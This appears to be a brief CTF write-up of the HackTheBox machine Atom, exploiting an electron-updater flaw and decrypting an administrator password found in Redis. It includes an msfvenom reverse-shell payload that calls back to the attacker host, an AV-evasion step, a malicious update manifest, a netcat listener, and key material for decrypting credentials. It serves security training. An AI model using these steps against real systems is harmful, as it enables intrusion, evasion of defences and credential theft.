---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/L26SsPBsmas/0.jpg
layout: post
media_subpath: /assets/posts/2021-07-10-electron-updater-rce-atom-hackthebox
tags:
- electron
- hackthebox
- kanban
- windows
title: Electron-Updater RCE - Atom @ HackTheBox
---

We are going to solve Atom, a 30-point machine on HackTheBox where we’ll analyze an electron app and exploit its updater. For root we will enumerate the running Redis instance, find an encrypted kanban password and then decrypt it.

{% youtube L26SsPBsmas %}

## Notes

**Generate payload**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.13 LPORT=1337 -f exe -o msf.exe
```

Then use [morbol ](https://github.com/xct/morbol.git)to add some av evasion (remember to rename the resulting file so it contains a single quote):

```
python3 morbol.py msf.exe x.exe
```

Latest.yml (update hash with `shasum -a 512 "x'.exe" | cut -d " " -f1 | xxd -r -p | base64` ):

```
version: 1.2.0
releaseDate: '2021-04-04T07:30:23.993Z'
path: http://10.10.14.13/x%27.exe
sha512: 7baNMM7wDS57/DUSc50QXQs7up1ZehDbj9i31nJp3s9mlQLMxOWO/6JnxnT8NRbXvoV32L4PVxQoqla4ACLOLA==
```

Put payload into "software\_updates" smb share and catch shell with `nc -lnvp 1337`.

**Enumerate redis**

```
redis-cli -h atom.htb -a kidvscat_yes_kidvscat
info
select 0
keys *
atom.htb:6379> GET "pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0"
"{\"Id\":\"e8e29158d70d44b1a1ba4949d52790a0\",\"Name\":\"Administrator\",\"Initials\":\"\",\"Email\":\"\",\"EncryptedPassword\":\"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\",\"Role\":\"Admin\",\"Inactive\":false,\"TimeStamp\":637530169606440253}"
```

Decrypt password with [CyberChef ](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)DES_Decrypt(%7B'option':'UTF8','string':'7ly6UznJ'%7D,%7B'option':'UTF8','string':'XuVUm5fR'%7D,'CBC','Raw','Raw')&input=T2RoN04zTDlhVlE4L3NyZFpnRzJoSVIwU1NKb0pLR2k)and use WinRM to connect as Administrator.